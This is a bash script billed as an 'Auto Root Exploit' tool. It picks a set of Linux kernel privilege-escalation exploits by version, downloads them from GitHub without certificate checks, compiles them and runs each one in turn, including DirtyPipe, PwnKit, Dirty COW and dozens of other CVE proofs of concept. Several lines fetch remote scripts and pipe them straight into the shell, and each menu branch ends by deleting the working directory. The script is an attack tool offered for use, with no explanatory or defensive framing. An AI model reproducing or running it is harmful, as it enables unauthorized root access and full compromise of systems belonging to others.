#!/bin/bash
#check gcc
gcc=$(which gcc)
if [ "$?" != "0" ]; then
    FaIl="YES"
    echo "[+] Gcc '->' not found!"
    sleep 1
    echo "exiting!"
    exit
else
    echo "[+] Gcc    : found!"
    sleep 1
fi

wget=$(which wget)
if [ "$?" != "0" ]; then
    FaIl="YES"
    echo "[+] Wget '->' not found!"
    sleep 1
    echo "exiting!"
    exit
else
    echo "[+] Wget    : found!"
    sleep 1
fi

git=$(which git)
if [ "$?" != "0" ]; then
    echo "[-] Git -> not found!"
    echo "[*] Continue ? (Y/N)"
    read -p "haxorsec@Localroot:~# " jawab
    if [ $jawab = "Y" || $jawab = "y" ];then
    clear
    else
    FaIl="YES"
    echo "[-] Git '->' not found!"
    sleep 1
    echo "exiting!"
    exit
    fi
else
    echo "[+] Git    : found!"
    sleep 1
fi

clear
echo "==================================================="
echo "              Auto Root Exploit v1"
echo "                by HaxorSecurity"
echo "==================================================="
echo "[x] Your Kernel : " 
uname -a
echo ""
echo "[x] Choose Your Kernel : "
echo "[1] 2x.x"
echo "[2] 3x.x"
echo "[3] 4x.x"
echo "[4] 5x.x"
echo "[5] TOP Exploit Root"
echo "[6] Folder Exploit"
read -p "haxorsec@Localroot:~# " localroot
link="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/"

kernel2=(
    2004/caps_to_root/15916.c
    2004/CVE-2004-0077/160.c
    2004/CVE-2004-1235/744.c
    2005/CVE-2005-0736/1397.c
    2005/CVE-2005-1263/25647.sh
    2006/CVE-2006-2451/2031.c
    2006/CVE-2006-3626/2013.c
    2008/CVE-2008-4210/6851.c
    2009/CVE-2009-1185/8478.sh
    2009/CVE-2009-1337/8369.sh
    2016/CVE-2016-5195/exp-1/dirty.c

)

kernel3=(
    2013/CVE-2013-0268/27297.c
    2013/CVE-2013-1858/clown-newuser.c
    2013/CVE-2013-2094/perf_swevent64.c
    2014/CVE-2014-0038/timeoutpwn64
    2014/CVE-2014-0196/cve-2014-0196-md.c
    2014/CVE-2014-3153/exp-1/35370.c
    2014/CVE-2014-3153/exp-2/towelroot.c
    2014/CVE-2014-4699/34134.c
    2014/CVE-2014-4014/33824.c
    2014/CVE-2014-9322/procrop.c
    2014/CVE-2014-9322/swapgs.c
    2014/CVE-2014-9322/z_shell.c
    2014/CVE-2014-9322/db.h
    2014/CVE-2014-9322/setss.S
    2015/CVE-2015-1328/37292.c
    2015/CVE-2015-8660/39166.c
    2016/CVE-2016-0728/cve-2016-0728.c
    2016/CVE-2016-9793/poc.c
    2017/CVE-2017-7308/poc.c
    2022/CVE20222639/exploit.c
    2022/CVE20222639/poc.c -O poc2.c
)

kernel4=(
    2016/CVE-2016-8655/40871.c
    2017/CVE-2017-6074/poc.c
    2017/CVE-2017-16995/upstream44.c
    2018/CVE-2018-5333/exploit.c
    2019/CVE-2019-13272/CVE-2019-13272.c
)

kernel5x=(
    2019/CVE-2019-15666/lucky0
    2020/CVE-2020-8835/exp.c
    2020/CVE-2020-8835/bpf.h
    2021/CVE-2021-22555/exp-2/exploit.c
    2022/CVE20220847/exp-1/exp.sh
)

topexploit=(
    https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
    https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential
    https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
    https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
    https://raw.githubusercontent.com/n3rada/DirtyPipe/main/dpipe
)

# exploit kernel 2x
if [ $localroot = 1 ]; then
    echo "[+] Get Material Download...."

    for kernel22 in "${kernel2[@]}"; do
        wget -q --no-check-certificate https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel22
    done
    delete=$(rm -rf exploit)
    gcc -w 15916.c -o exploit && setcap cap_sys_admin ep exploit && ./exploit && $delete
    gcc -O3 -static -fomit-frame-pointer 160.c -o exploit && ./exploit && $delete
    gcc -O2 -fomit-frame-pointer 744.c -o exploit && ./exploit && $delete
    gcc -o k-rad3 1397.c -static -O2 -o exploit && ./exploit && $delete
    gcc 2031.c -o exploit -static -Wall && ./exploit && $delete
    gcc 2013.c -o exploit && ./exploit && $delete
    gcc 6851.c -o exploit && ./exploit && $delete
    gcc -pthread dirty.c -o dirty -lcrypt && ./dirty kontol1337 && rm -rf dirty
    bash 25647.sh
    bash 8478.sh
    bash 8369.sh
    echo "[+] exploit CVE-2021-4034"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
    rm -rf 25647.sh 25647.sh 8478.sh 8369.sh 8369.sh
    rm -rf ./*
fi

# exploit kernel 3x
if [ $localroot = 2 ]; then
    echo "[+] Get Material Download...."
    for kernel33 in "${kernel3[@]}"; do
        wget -q --no-check-certificate https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel33
    done
    echo "[+] exploit CVE-2021-4034"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
    echo "[+] Wait Exploiting"
    delete=$(rm -rf exploit)
    echo "[+] Exploit CVE-2015-1328"
    gcc 37292.c -o exploit && ./exploit && rm -rf exploit

    echo "[+] Exploit CVE-2013-0268"
    gcc 27297.c -o exploit && ./exploit && rm -rf exploit

    echo "[+] Exploit CVE-2015-8660"
    gcc 39166.c -o exploit && ./exploit && rm -rf exploit

    echo "[+] Exploit CVE-2013-1858"
    gcc -Wall clown-newuser.c -static -o exploit && ./exploit && rm -rf exploit

    echo "[+] exploit CVE-2013-2094"
    gcc perf_swevent64.c -O2 -o exploit && ./exploit 0 && rm -rf exploit

    echo "[+] exploit CVE-2014-0038"
    chmod 0755 timeoutpwn64 && ./timeoutpwn64 && rm -rf timeoutpwn64
    echo "[+] exploit cve-2014-0196-md"
    gcc cve-2014-0196-md.c -lutil -lpthread -o exploit && ./exploit && rm -rf exploit

    echo "[+] exploit CVE-2014-4699"
    gcc -O2 34134.c -o exploit && ./exploit && rm -rf exploit

    echo "[+] exploit CVE-2014-4014"
    gcc 33824.c -o exploit && ./exploit && rm -rf exploit
    echo "[+] exploit cve-2016-0728"
    gcc cve-2016-0728.c -o exploit -lkeyutils -Wall && ./exploit && rm -rf exploit
    echo "[+] exploit CVE-2014-9322"
    gcc z_shell.c -o z_shell && gcc -o procrop procrop.c setss.S && gcc -o p_write8 swapgs.c setss.S -lpthread && ./procrop 1 &
    ./p_write8 1 && rm -rf p_write8
    echo "[+] exploit CVE-2016-9793"
    gcc -pthread poc.c -o exploit && setcap cap_net_admin ep ./exploit && ./exploit && rm -rf exploit
    echo "[+] exploit CVE-2017-7308"
    mv poc.c.1 poc1.c && gcc poc1.c -o exploit && ./exploit && rm -rf exploit
    echo "[+] exploit CVE20222639"
    mv poc.c.2 poc2.c && gcc exploit.c -o exploit -static -no-pie -s && gcc poc2.c -o poc -static -no-pie -Werror -s -Os -Wno-unused-result && ./poc && ./exploit && rm -rf exploit
    echo "[+] exploit CVE-2014-3153"
    gcc 35370.c -o exploit -lpthread && ./exploit && rm -rf exploit
    echo "[+] exploit CVE-2014-3153"
    gcc -fno-stack-protector -m32 -O0 -pthread towelroot.c -o exploit && ./exploit && rm -rf exploit
    rm -rf ./*
fi

# exploit kernel 4
if [ $localroot = 3 ]; then
    for kernel44 in "${kernel4[@]}"; do
        wget -q --no-check-certificate https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel44
    done
    delete=$(rm -rf exploit)
    gcc 40871.c -o exploit -lpthread && ./exploit && $delete
    gcc poc.c -o exploit && ./exploit && $delete
    gcc upstream44.c -o exploit && ./exploit && $delete
    gcc -O3 -pthread -static -g -masm=intel ./exploit.c -o exploit && ./exploit && $delete
    gcc -s CVE-2019-13272.c -o exploit && ./exploit && $delete
    rm -rf ./*
fi

# exploit kernel 5x
if [ $localroot = 4 ]; then
    for kernel55 in "${kernel5x[@]}"; do
        wget -q --no-check-certificate https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel55
    done
    delete=$(rm -rf exploit)
    gcc exp.c -o exploit -static && ./exploit && $delete
    gcc exploit.c -o exploit && ./exploit && $delete
    bash exp.sh
        chmod 0755 lucky0
    while :; do ./lucky0 -q && break; done
    rm -rf ./*
fi

# exploit top exploit
if [ $localroot = 5 ]; then
    for top in "${topexploit[@]}"; do
        wget -q --no-check-certificate $top
    done

    delete=$(rm -rf exploit)
    gcc exploit.c -o exploit && chmod 0755 exploit && ./exploit && $delete
    chmod 0755 exp_file_credential && ./exp_file_credential && rm -rf exp_file_credential
    chmod 0755 PwnKit && ./PwnKit && rm -rf PwnKit
    bash exploit.sh
    chmod x dpipe && ./dpipe --root
    git clone https://github.com/initstring/dirty_sock && cd dirty_sock && python3 dirty_sockv2.py
    wget -q --no-check-certificate https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh && bash screenroot.sh
    wget -q --no-check-certificate https://raw.githubusercontent.com/Liang2580/CVE-2021-33909/main/exploit.c && gcc exploit.c -o exploit && chmod +x exploit &&./exploit && $delete
    wget -q --no-check-certificate https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh && bash exploit.sh && rm -rf exploit.sh
    wget -q --no-check-certificate https://raw.githubusercontent.com/jollheef/lpe/master/CVE-2017-1000112/CVE-2017-1000112.c -O pwn.c && gcc pwn.c -o pwn && ./pwn
    wget -q --no-check-certificate  https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh && bash exploit.sh
    cd .. && git clone https://github.com/Markakd/CVE-2021-4154 && cd CVE-2021-4154 && gcc exp.c -o exp && gcc kctf_exp.c -o kctf
    ./exp && ./kctf
    rm -rf ./*
fi

# exploit folder
if [ $localroot = 6 ]; then
    git clone https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits/ /tmp/Linux-Privilege-Escalation-Exploits

    # tahun
    oalah="Linux-Privilege-Escalation-Exploits/2022"
    oalahh="Linux-Privilege-Escalation-Exploits/2019"
    oalahhh="Linux-Privilege-Escalation-Exploits/2020"
    oalahhhh="Linux-Privilege-Escalation-Exploits/2021"
    oalahhhhi="Linux-Privilege-Escalation-Exploits/2017"

    # CVE 
    CVE20220185v1="CVE-2022-0185/exp-1"
    CVE20220185v2="CVE-2022-0185/exp-2"
    CVE20220847v1="CVE-2022-0847/exp-1"
    CVE20220847v2="CVE-2022-0847/exp-2"
    CVE20220847v3="CVE-2022-0847/exp-3"
    CVE20220995v4="CVE-2022-0995"
    CVE20221015="CVE-2022-1015"
    CVE202223222="CVE-2022-23222"
    CVE202225636v1="CVE-2022-25636/exp-1"
    CVE202225636v2="CVE-2022-25636/exp-2"
    CVE20222585="CVE-2022-2585"
    CVE20222586="CVE-2022-2586"
    CVE20222588="CVE-2022-2588"
    CVE20222602v1="CVE-2022-2602/exp-1"
    CVE20222602v2="CVE-2022-2602/exp-2"
    CVE20222639="CVE-2022-2639"
    CVE202227666="CVE-2022-27666"
    CVE202232250="CVE-2022-32250"
    CVE202234918v1="CVE-2022-34918/exp-1"
    CVE202234918v2="CVE-2022-34918/exp-2"
    CVE20197304="CVE-2019-7304"
    CVE201915666="CVE-2019-15666"
    CVE20208835="CVE-2020-8835"
    CVE20213156="CVE-2021-3156"
    CVE202127365="CVE-2021-27365"
    CVE20171000367="CVE-2017-1000367"

    echo "[+] exploit CVE20220847v1"
    cd /tmp/$oalah/$CVE20220847v1 && bash exp.sh

    echo "[+] exploit CVE20220847v2"
    cd /tmp/$oalah/$CVE20220847v2 && gcc dirtypipez.c -o dpipe -lpthread && ./dpipe /bin/su

    echo "[+] exploit CVE20220847v3"
    cd /tmp/$oalah/$CVE20220847v3 && gcc exploit.c -o exploit && ./exploit /bin/sh dW5hbWUgLWE7aWQ=

    echo "[+] exploit CVE20220995"
    cd /tmp/$oalah/$CVE20220995 && make && ./exploit

    echo "[+] exploit CVE20221015"
    cd /tmp/$oalah/$CVE20221015 && make && ./pwn

    echo "[+] exploit CVE202223222"
    cd /tmp/$oalah/$CVE202223222 && make && ./exploit

    echo "[+] exploit CVE202225636v1"
    cd /tmp/$oalah/$CVE202225636v1 && make && ./exploit

    echo "[+] exploit CVE20222585"
    cd /tmp/$oalah/$CVE20222585 && gcc exploit.c -o exploit -lpthread && ./exploit

    echo "[+] exploit CVE20222586"
    cd /tmp/$oalah/$CVE20222586 && gcc CVE-2022-2586.c -o exploit -lmnl -lnftnl -no-pie -lpthread && ./exploit

    echo "[+] exploit CVE20222588"
    cd /tmp/$oalah/$CVE20222588 && chmod x exp_file_credential && ./exp_file_credential

    echo "[+] exploit CVE20222602v1"
    cd /tmp/$oalah/$CVE20222602v1 && gcc exploit.c -o exploit -pthread && ./exploit

    echo "[+] exploit CVE20222602v2"
    cd /tmp/$oalah/$CVE20222602v2 && make && ./poc_userfaultfd && ./poc_inode_locking

    echo "[+] exploit CVE20222639"
    cd /tmp/$oalah/$CVE20222639 && make && ./poc && ./exploit

    echo "[+] exploit CVE-2022-32250"
    cd /tmp/$oalah/$CVE202232250 && gcc -lmnl -lnftnl exploit.c -o exploit && ./exploit

    echo "[+] exploit CVE-2022-34918v1"
    cd /tmp/$oalah/$CVE202234918v1 && make && ./poc

    echo "[+] exploit CVE-2019-7304"
    cd /tmp/$oalahh/$CVE20197304 && python3 ./dirty_sockv2.py

    echo "[+] exploit CVE202227666"
    cd /tmp/$oalah/$CVE202227666 && bash compile.sh && bash run.sh && exit

    echo "[+] exploit CVE-2019-15666"
    cd /tmp/$oalahh/$CVE201915666
    chmod x lucky0
    while :; do ./lucky0 -q && break; done

    echo "[+] exploit CVE-2020-8835"
    cd /tmp/$oalahhh/$CVE20208835 && gcc exp.c -o exp -static ./exp

    echo "[+] exploit CVE-2021-3156"
    cd /tmp/$oalahhhh/$CVE20213156 && make && ./exploit

    echo "[+] exploit CVE202234918v2"
    cd /tmp/$oalah/$CVE202234918v2 && make && ./exploit

    echo "[+] exploit CVE-2021-27365"
    cd /tmp/$oalahhhh/$CVE202127365 && make && cp a.sh /tmp/ && chmod x /tmp/a.sh && ./exploit

    echo "[+] exploit CVE20220185"
    cd /tmp/$oalah/$CVE20220185v1 && make && ./exploit

    echo "[+] exploit CVE20220185 exp2"
    cd /tmp/$oalah/$CVE20220185v2 && make && ./exploit

    echo "[+] exploit CVE202225636v2"
    cd /tmp/$oalah/$CVE202225636v2 && make && ./exploit
    echo "[+] exploit CVE-2017-1000367"
    cd /tmp/$oalahhhhi/$CVE20171000367 && gcc -o sudopwn sudopwn.c -lutil && ./sudopwn
    rm -rf ./*
fi
